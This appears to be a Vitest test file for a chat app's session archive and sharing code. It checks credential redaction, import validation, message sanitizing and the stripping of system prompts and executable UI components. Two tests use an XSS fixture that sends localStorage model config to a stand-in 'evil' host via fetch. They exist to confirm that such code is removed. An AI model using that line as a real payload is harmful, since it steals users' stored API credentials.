// @vitest-environment node
import { describe, it, expect } from 'vitest'
import { buildArchive, parseArchive, sanitizeMessages, shareSnapshot, reconcileInterruptedTools, ARCHIVE_VERSION } from '../lib/session-archive'

const msg = (over: Record<string, any> = {}) => ({
  id: 'a1', role: 'user', content: 'hello', ...over,
})

describe('buildArchive → parseArchive roundtrip', () => {
  it('preserves messages with tool calls and usage', () => {
    const messages = [
      msg(),
      msg({
        id: 'a2', role: 'assistant', content: 'hi!',
        toolCalls: [{ id: 't1', name: 'http', status: 'success', result: { ok: true } }],
        usage: { inputTokens: 10, outputTokens: 5, totalTokens: 15 },
      }),
    ]
    const parsed = parseArchive(buildArchive('mytiny', messages))
    expect(parsed.tiny).toBe('mytiny')
    expect(parsed.version).toBe(ARCHIVE_VERSION)
    expect(parsed.messages).toHaveLength(2)
    expect(parsed.messages[1].toolCalls[0].name).toBe('http')
    expect(parsed.messages[1].usage.totalTokens).toBe(15)
  })

  it('redacts credential-shaped fields on export', () => {
    const messages = [
      msg({
        id: 'a3', role: 'assistant', content: 'called the api',
        toolCalls: [{
          id: 't2', name: 'http', status: 'success',
          input: { apiKey: 'sk-super-secret', authorization: 'Bearer xyz' },
        }],
      }),
    ]
    const raw = buildArchive('t', messages)
    expect(raw).not.toContain('sk-super-secret')
    expect(raw).not.toContain('Bearer xyz')
    expect(raw).toContain('[redacted]')
  })

  it('redacts by key SUBSTRING — the real BYOK header and token variants', () => {
    const messages = [
      msg({
        id: 'a4', role: 'assistant', content: 'echoed headers',
        toolCalls: [{
          id: 't3', name: 'http', status: 'success',
          input: {
            'x-tiny-model-api-key': 'sk-byok-leak',   // the REAL header name
            access_token: 'gho_abc123',
            clientSecret: 'shhh',
          },
          // numeric "tokens" fields must survive (string values only)
          result: { tokens: 4321 },
        }],
      }),
    ]
    const raw = buildArchive('t', messages)
    expect(raw).not.toContain('sk-byok-leak')
    expect(raw).not.toContain('gho_abc123')
    expect(raw).not.toContain('shhh')
    expect(raw).toContain('4321')
  })

  it('redacts a secret held under a sensitive key as an ARRAY or OBJECT', () => {
    // The prior regex matched only a STRING value ("token":"sk-…"); a secret
    // stored as an array/object under a sensitive key serialized verbatim
    // (a regex can't span the balanced brackets). Structural redaction blanks
    // the whole value regardless of shape.
    const messages = [
      msg({
        id: 'a6', role: 'assistant', content: 'multi-key call',
        toolCalls: [{
          id: 't5', name: 'http', status: 'success',
          input: {
            api_keys: ['sk-LIVE-ONE', 'sk-LIVE-TWO'],       // array value
            authorization: { bearer: 'sk-NESTED-SECRET' },  // object value
          },
        }],
      }),
    ]
    const raw = buildArchive('t', messages)
    expect(raw).not.toContain('sk-LIVE-ONE')
    expect(raw).not.toContain('sk-LIVE-TWO')
    expect(raw).not.toContain('sk-NESTED-SECRET')
    expect(raw).toContain('[redacted]')
  })

  it('redacts a credential value that itself contains a quote (escape-aware)', () => {
    // JSON.stringify renders the embedded " as \" — a naive "[^"]*" value
    // pattern stops at that escaped quote and leaves the tail unredacted.
    const messages = [
      msg({
        id: 'a5', role: 'assistant', content: 'weird token',
        toolCalls: [{
          id: 't4', name: 'http', status: 'success',
          input: { authorization: 'Bearer ab"cd-SECRETTAIL' },
        }],
      }),
    ]
    const raw = buildArchive('t', messages)
    expect(raw).not.toContain('SECRETTAIL')
    expect(raw).not.toContain('cd-SECRETTAIL')
    expect(raw).toContain('[redacted]')
  })
})

describe('parseArchive validation', () => {
  it('rejects non-JSON', () => {
    expect(() => parseArchive('not json')).toThrow(/JSON/)
  })

  it('rejects random JSON without the discriminator', () => {
    expect(() => parseArchive('{"messages": []}')).toThrow(/archive/)
  })

  it('rejects newer versions', () => {
    const doc = JSON.stringify({ tinyai_session: true, version: ARCHIVE_VERSION + 1, tiny: 't', messages: [msg()] })
    expect(() => parseArchive(doc)).toThrow(/version/)
  })

  it('drops malformed messages, errors when none survive', () => {
    const doc = JSON.stringify({
      tinyai_session: true, version: 1, tiny: 't',
      messages: [msg(), { junk: true }, { id: 1, role: 'user', content: 'no' }],
    })
    expect(parseArchive(doc).messages).toHaveLength(1)

    const empty = JSON.stringify({ tinyai_session: true, version: 1, tiny: 't', messages: [{ junk: true }] })
    expect(() => parseArchive(empty)).toThrow(/no messages/)
  })

  it('STRIPS uiComponents from an imported file (untrusted → new Function XSS)', () => {
    const doc = JSON.stringify({
      tinyai_session: true, version: 1, tiny: 't',
      messages: [{
        id: '1', role: 'assistant', content: 'x',
        uiComponents: [{ id: 'u1', componentCode: 'fetch("//evil?"+localStorage.tiny_model_config)' }],
      }],
    })
    const parsed = parseArchive(doc)
    expect(parsed.messages[0].uiComponents).toBeUndefined()
    expect(JSON.stringify(parsed)).not.toContain('evil')
  })
})

describe('sanitizeMessages (share/localStorage load guard)', () => {
  it('non-arrays → [] (the crash the render .map() would hit)', () => {
    expect(sanitizeMessages(null)).toEqual([])
    expect(sanitizeMessages(undefined)).toEqual([])
    expect(sanitizeMessages({})).toEqual([])          // base64 of "{}"
    expect(sanitizeMessages(42)).toEqual([])
    expect(sanitizeMessages('a string')).toEqual([])
  })

  it('keeps well-formed messages, drops malformed entries', () => {
    const out = sanitizeMessages([
      { id: 'a', role: 'user', content: 'hi' },
      { id: 'b', role: 'assistant', content: 'yo', toolCalls: [] },
      { role: 'user', content: 'no id' },     // dropped
      { id: 'c', content: 'no role' },          // dropped
      { id: 'd', role: 'user' },                // dropped (no content)
      null,                                     // dropped
      'garbage',                                // dropped
    ])
    expect(out.map((m: any) => m.id)).toEqual(['a', 'b'])
  })

  it('preserves extra fields on valid messages', () => {
    const [m] = sanitizeMessages([{ id: 'a', role: 'assistant', content: 'x', usage: { totalTokens: 5 }, modelId: 'm' }])
    expect(m.usage.totalTokens).toBe(5)
    expect(m.modelId).toBe('m')
  })

  it('coerces non-array nested collections so the render loop cannot throw', () => {
    // A crafted legacy ?chat= link can carry a length-bearing NON-array under a
    // field the render guards with truthy + `.length > 0` only (never
    // Array.isArray): "boom".length is 6, so the block runs and "boom".filter
    // throws a TypeError DURING RENDER → route error boundary → full-page blank.
    const [m] = sanitizeMessages([{
      id: 'a', role: 'assistant', content: 'x',
      toolCalls: 'boom',            // string — length-bearing, would .filter-throw
      speech: { length: 3 },        // array-like object — would .map-throw
      attachments: 42,              // number — .length undefined, guard-safe but normalize anyway
      followups: 'nope',
      reasoning: { length: 2 },     // object under a React text child → would throw
    }])
    expect(m.toolCalls).toBeUndefined()
    expect(m.speech).toBeUndefined()
    expect(m.attachments).toBeUndefined()
    expect(m.followups).toBeUndefined()
    expect(m.reasoning).toBeUndefined()
  })

  it('keeps well-formed nested collections + string reasoning intact', () => {
    const [m] = sanitizeMessages([{
      id: 'a', role: 'assistant', content: 'x',
      toolCalls: [{ name: 't' }], speech: ['s'], attachments: [{ type: 'image' }],
      followups: ['f'], reasoning: 'because',
    }])
    expect(m.toolCalls).toEqual([{ name: 't' }])
    expect(m.speech).toEqual(['s'])
    expect(m.attachments).toEqual([{ type: 'image' }])
    expect(m.followups).toEqual(['f'])
    expect(m.reasoning).toBe('because')
  })
})

describe('shareSnapshot (public share privacy)', () => {
  it('DROPS system messages — the private-tiny prompt-leak guard', () => {
    const out = shareSnapshot([
      { id: '0', role: 'system', content: 'SECRET private system prompt' },
      { id: '1', role: 'user', content: 'hi' },
      { id: '2', role: 'assistant', content: 'hello' },
    ])
    expect(out.map((m) => m.id)).toEqual(['1', '2'])
    expect(JSON.stringify(out)).not.toContain('SECRET')
  })

  it('strips tool payloads, reasoning, and failure state', () => {
    const [m] = shareSnapshot([{
      id: '1', role: 'assistant', content: 'answer',
      toolCalls: [{ name: 'http', result: { apiKey: 'sk-leak' } }],
      reasoning: 'internal chain of thought',
      failedPrompt: 'retry me',
    }])
    expect(m).toEqual({ id: '1', role: 'assistant', content: 'answer' })
    expect(JSON.stringify(m)).not.toMatch(/sk-leak|chain of thought|retry me/)
  })

  it('DROPS uiComponents — componentCode is new Function XSS in the viewer', () => {
    const [m] = shareSnapshot([{
      id: '1', role: 'assistant', content: 'x',
      uiComponents: [{ id: 'u1', componentCode: 'fetch("//evil?"+localStorage.tiny_model_config)' }],
      followups: ['next?'],
    }])
    // uiComponents must NOT survive into a public share (executed via
    // new Function in every viewer's browser on the tiny.technology origin)
    expect(m.uiComponents).toBeUndefined()
    expect(JSON.stringify(m)).not.toContain('evil')
    // reader-facing followups still survive
    expect(m.followups).toEqual(['next?'])
  })

  it('non-array → []', () => {
    expect(shareSnapshot(null as any)).toEqual([])
    expect(shareSnapshot(undefined as any)).toEqual([])
  })
})

describe('reconcileInterruptedTools (restore-boundary tool resolution)', () => {
  it("flips 'calling' tools to error with an interrupted note", () => {
    const out = reconcileInterruptedTools([
      { id: 'a', role: 'assistant', content: 'x', toolCalls: [
        { id: 't1', name: 'http', status: 'calling' },
        { id: 't2', name: 'learn', status: 'success', result: 'ok' },
      ] },
    ])
    expect(out[0].toolCalls[0].status).toBe('error')
    expect(out[0].toolCalls[0].error).toMatch(/interrupted/)
    // finished siblings untouched
    expect(out[0].toolCalls[1]).toEqual({ id: 't2', name: 'learn', status: 'success', result: 'ok' })
  })

  it('leaves messages without stuck tools identical (no gratuitous copies)', () => {
    const msgs = [
      { id: 'a', role: 'user', content: 'hi' },
      { id: 'b', role: 'assistant', content: 'done', toolCalls: [{ id: 't', status: 'success' }] },
    ]
    const out = reconcileInterruptedTools(msgs)
    expect(out[0]).toBe(msgs[0])
    expect(out[1]).toBe(msgs[1])
  })

  it('tolerates malformed toolCalls entries', () => {
    const out = reconcileInterruptedTools([
      { id: 'a', role: 'assistant', content: '', toolCalls: [null, { status: 'calling' }] },
      { id: 'b', role: 'assistant', content: '', toolCalls: 'not-an-array' },
    ])
    expect(out[0].toolCalls[1].status).toBe('error')
    expect(out[1].toolCalls).toBe('not-an-array')
  })
})
